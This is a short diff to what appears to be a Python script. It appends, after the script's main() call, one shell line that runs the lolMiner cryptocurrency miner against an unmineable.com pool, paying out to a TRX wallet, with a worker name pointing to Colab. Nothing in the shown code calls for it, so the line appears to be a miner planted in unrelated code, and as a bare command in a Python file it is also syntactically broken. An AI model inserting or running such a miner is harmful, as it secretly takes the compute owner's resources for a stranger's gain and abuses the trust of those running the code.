@@ -146,3 +146,4 @@ if __name__ == "__main__":
     main()
 
 #----------------------------------------------------------------------------
+lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TAzMuSAfEUq7mr2zh1X6dsRdRiPAG98g14.colab --ethstratum ETHPROXY
